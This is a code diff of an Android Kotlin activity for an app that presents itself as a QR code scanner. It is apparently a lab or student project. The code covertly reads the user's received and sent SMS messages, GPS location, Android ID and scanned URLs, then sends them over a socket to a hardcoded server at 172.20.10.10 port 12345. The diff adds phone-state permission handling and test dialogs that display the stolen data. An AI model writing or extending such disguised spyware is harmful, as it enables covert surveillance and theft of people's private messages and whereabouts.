@@ -13,11 +13,8 @@ import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 
-import java.io.IOException
-import java.io.InputStreamReader
 import java.io.OutputStreamWriter
 import java.net.Socket
-import java.io.BufferedReader
 
 import android.content.pm.PackageManager
 import android.location.Location
@@ -33,15 +30,21 @@ import android.os.Looper
 import android.provider.Settings.Secure
 import android.annotation.SuppressLint
 import android.net.Uri
-import android.widget.Toast
+
+import kotlinx.coroutines.DelicateCoroutinesApi
+
 import java.text.SimpleDateFormat
 import java.util.Date
+
+// Tests
+import androidx.appcompat.app.AlertDialog
 
 class MainActivity : AppCompatActivity() {
 
     private val requestLocationPermission = 1
     private val requestSMSPermission = 2
-    private val requestAllPermission = 3
+    private val requestPhonePermission = 3
+    private val requestAllPermission = 4
     private val received = 1000
     private val sent = 2000
     private lateinit var fusedLocationClient: FusedLocationProviderClient
@@ -57,8 +60,8 @@ class MainActivity : AppCompatActivity() {
         var ipServer = "172.20.10.10"
     }
 
-
     // ------- ACTIONS TO PERFORM WHEN CREATING AND DESTROYING THE ACTIVITY -----------
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -77,7 +80,6 @@ class MainActivity : AppCompatActivity() {
         qrCodeValueButton.isEnabled = false
 
         initButtonClickListener()
-
     }
 
     override fun onDestroy() {
@@ -86,6 +88,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     // ---------- NORMAL OPERATION OF THE QR CODE SCANNER ---------------
+
     private fun initButtonClickListener() {
         startScanButton.setOnClickListener {
             val intent = Intent(this, ScanQrCodeActivity::class.java)
@@ -93,7 +96,7 @@ class MainActivity : AppCompatActivity() {
             resultLauncher.launch(intent)
         }
 
-        qrCodeValueButton.setOnClickListener() {
+        qrCodeValueButton.setOnClickListener {
             val intent = Intent(this, WebPageActivity::class.java)
             intent.putExtra("urlScanned", qrCodeValueButton.text)
             qrCodeValueButton.isEnabled = false
@@ -107,10 +110,9 @@ class MainActivity : AppCompatActivity() {
             updateQrCodeButton(data)
             val sendUrl = "url : " + data.toString()
             newPacket(sendUrl)
-
         }
-
     }
+
     private fun updateQrCodeButton(data: String?) {
         data?.let {
             runOnUiThread {
@@ -136,10 +138,12 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.ACCESS_COARSE_LOCATION
             ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                 this,
+                Manifest.permission.READ_PHONE_STATE
+            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                this,
                 Manifest.permission.READ_SMS
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-
             ActivityCompat.requestPermissions(
                 this,
                 arrayOf(
@@ -147,58 +151,63 @@ class MainActivity : AppCompatActivity() {
                     Manifest.permission.RECORD_AUDIO,
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION,
+                    Manifest.permission.READ_PHONE_STATE,
                     Manifest.permission.READ_SMS
-
                 ),
                 requestAllPermission
             )
             return
         }
-
     }
 
     // -------------- TO REQUEST THE DIFFERENT PERMISSIONS ----------------
+
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        if (requestCode == requestLocationPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
+        if (requestCode == requestLocationPermission
+            && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
+            && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
             getLocation()
         }
-        if (requestCode == requestSMSPermission && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+        if (requestCode == requestSMSPermission
+            && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
             retrieveSMSData(this, received)
             retrieveSMSData(this, sent)
+        }
+        if (requestCode == requestPhonePermission
+            && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+            getAndroidId(this)
         }
         if (requestCode == requestAllPermission
             && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
             && grantResults[1] == PackageManager.PERMISSION_GRANTED
             && grantResults[2] == PackageManager.PERMISSION_GRANTED
             && grantResults[3] == PackageManager.PERMISSION_GRANTED
-            && grantResults[4] == PackageManager.PERMISSION_GRANTED) {
+            && grantResults[4] == PackageManager.PERMISSION_GRANTED
+            && grantResults[5] == PackageManager.PERMISSION_GRANTED) {
             requestAllPermissions()
         }
-
     }
 
     // ---------------- TO SEND DATA TO THE SERVER -----------------------
+
+    @OptIn(DelicateCoroutinesApi::class)
     private fun newPacket(data: String) {
 
         GlobalScope.launch(Dispatchers.IO) {
             try {
                 Socket(ipServer, 12345).use { socket ->
                     val writer = OutputStreamWriter(socket.getOutputStream())
-                    var packet = "$androidId,$data"
+                    val packet = "$androidId,$data"
                     writer.use {
                         it.write(packet)
                         it.flush()
                     }
                 }
-
             } catch (e: Exception) {
-
                 e.printStackTrace()
-                // Handle exceptions like IOException, UnknownHostException, etc.
             }
         }
-
     }
 
     // ----------- MAP LOCATION FUNCTIONS ------------------
@@ -210,7 +219,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    fun getCurrentDate(): String {
+    private fun getCurrentDate(): String {
         val calendar = Calendar.getInstance()
         val year = calendar.get(Calendar.YEAR)
         val month = calendar.get(Calendar.MONTH) + 1
@@ -234,7 +243,7 @@ class MainActivity : AppCompatActivity() {
                 arrayOf(
                     Manifest.permission.ACCESS_FINE_LOCATION,
                     Manifest.permission.ACCESS_COARSE_LOCATION
-                ),
+                    ),
                 requestLocationPermission
             )
             return
@@ -249,22 +258,42 @@ class MainActivity : AppCompatActivity() {
 
                     newPacket(data)
 
+                    // Tests
+                    showLocationDialog(latitude, longitude)
                 }
-
             }
-
     }
 
-    // GET THE ANDROID ID TO IDENTIFY A PHONE ON THE SERVER
+    // ------- GET THE ANDROID ID TO IDENTIFY A PHONE ON THE SERVER -------
+
     @SuppressLint("HardwareIds")
-    private fun getAndroidId(context: Context){
+    private fun getAndroidId(context: Context) {
+
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.READ_PHONE_STATE
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(
+                    Manifest.permission.READ_PHONE_STATE
+                ),
+                requestPhonePermission
+            )
+            return
+        }
+
         androidId = Secure.getString(context.contentResolver, Secure.ANDROID_ID)
 
-
+        // Tests
+        showAndroidIdDialog(androidId)
     }
 
     // ----------- SMS RETRIEVAL FUNCTIONS -----------------
-    private fun smsPermission() {
+
+    private fun retrieveSMSData(context: Context, receivedOrSent: Int) {
+
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.READ_SMS
@@ -279,11 +308,6 @@ class MainActivity : AppCompatActivity() {
             )
             return
         }
-    }
-
-    private fun retrieveSMSData(context: Context, receivedOrSent: Int) { //: List<Triple<String, String, String>> {
-
-        smsPermission()
 
         val smsList = mutableListOf<Triple<String, String, String>>()
         var uriString = ""
@@ -312,23 +336,32 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (smsList.isNotEmpty()) {
-
             for ((date, address, message) in smsList) {
                 sendSMSToServer(date, address, message, receivedOrSent)
             }
         }
 
+        // Tests
+        if (smsList.isNotEmpty()) {
+            var i = 0
+            for ((date, address, message) in smsList) {
+                if (i == 0) {
+                    showSMSDialog(date, address, message, receivedOrSent)
+                }
+                i = 1
+            }
+        }
     }
 
-    private fun sendSMSToServer(date: String, addr: String, msg: String, receivedOrSent: Int) {
+    private fun sendSMSToServer(date: String, address: String, msg: String, receivedOrSent: Int) {
 
         var data = ""
         if (receivedOrSent == received) {
-            data = "sms : $date, sender: $addr, Message: $msg"
+            data = "sms : $date, sender: $address, Message: $msg"
 
         }
         else if (receivedOrSent == sent) {
-            data = "sms : $date, recipient: $addr, Message: $msg"
+            data = "sms : $date, recipient: $address, Message: $msg"
         }
 
         newPacket(data)
@@ -338,7 +371,44 @@ class MainActivity : AppCompatActivity() {
     private fun timestampToString(timestamp: Long): String {
         val dateFormat = SimpleDateFormat("dd-MM-yyyy HH:mm:ss")
         val date = Date(timestamp)
+
         return dateFormat.format(date)
     }
 
+    // Tests
+    private fun showSMSDialog(date: String, address: String, msg: String, receivedOrSent: Int) {
+        val alertDialogBuilder = AlertDialog.Builder(this)
+        if (receivedOrSent == received) {
+            alertDialogBuilder.setTitle("SMS reçu")
+            alertDialogBuilder.setMessage("Date:\n$date\n\nExpéditeur:\n$address\n\nMessage:\n$msg")
+        }
+        else if (receivedOrSent == sent) {
+            alertDialogBuilder.setTitle("SMS envoyé")
+            alertDialogBuilder.setMessage("Date:\n$date\n\nDestinataire:\n$address\n\nMessage:\n$msg")
+        }
+        alertDialogBuilder.setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
+
+        val alertDialog: AlertDialog = alertDialogBuilder.create()
+        alertDialog.show()
+    }
+
+    private fun showAndroidIdDialog(androidID: String) {
+        val alertDialogBuilder = AlertDialog.Builder(this)
+        alertDialogBuilder.setTitle("Android ID")
+        alertDialogBuilder.setMessage("Android ID: $androidID")
+        alertDialogBuilder.setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
+
+        val alertDialog: AlertDialog = alertDialogBuilder.create()
+        alertDialog.show()
+    }
+
+    private fun showLocationDialog(latitude: Double, longitude: Double) {
+        val alertDialogBuilder = AlertDialog.Builder(this)
+        alertDialogBuilder.setTitle("Coordonnées de localisation")
+        alertDialogBuilder.setMessage("Latitude: $latitude\nLongitude: $longitude")
+        alertDialogBuilder.setPositiveButton("OK") { dialog, _ -> dialog.dismiss() }
+
+        val alertDialog: AlertDialog = alertDialogBuilder.create()
+        alertDialog.show()
+    }
 }
